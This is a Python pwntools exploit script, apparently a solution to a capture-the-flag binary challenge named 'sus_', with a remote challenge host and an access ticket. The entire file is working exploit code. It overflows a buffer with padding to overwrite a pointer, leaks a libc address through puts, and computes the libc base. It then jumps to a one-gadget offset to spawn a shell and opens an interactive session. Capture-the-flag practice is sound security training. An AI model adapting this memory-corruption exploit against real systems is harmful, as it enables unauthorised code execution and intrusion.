#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = './sus_'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return process([exe] + argv, *a, **kw)
    if args.REMOTE:
        return remote("suscall.shellweplayaga.me", 505)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

elf = context.binary = ELF("./sus_")
io = start()
ticket = b'ticket{NiceDialup3334n24:Dc18ctaSmj_o6ck0WAO2-q7wSmUJ4w8-y719xXeqNBNGyC6t}'
if args.GDB:
    cmd="""
    handle SIGALRM noignore
    b*0x0000000000401317 
    """
    gdb.attach(io, cmd)
    
if args.REMOTE:
    io.sendlineafter(b'Ticket please: ', ticket)
    
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
heap_top = 0x00000000004064A0
heap_base = 0x4040a0

pl = b'A'*0x1000 + b'\n'
io.send(pl)

pl = b'A'*0x1000 + b'\n'
io.send(pl)

pl = b'A'*928+p32(0x404038) + b'\n'

io.send(pl)

pl = b'A'*8+p32(elf.plt.puts)

io.send(pl)

io.recvuntil(b'Looking for sus files...\n')

libc.address = u64(io.recv(6)+b'\0\0')  -  0xea540
print(hex(libc.address))

pause()
pl = p64(0xdeadbeef)+b'A'*8+p64(libc.address+0xebc81)+b'\n'
io.send(pl)


io.interactive()
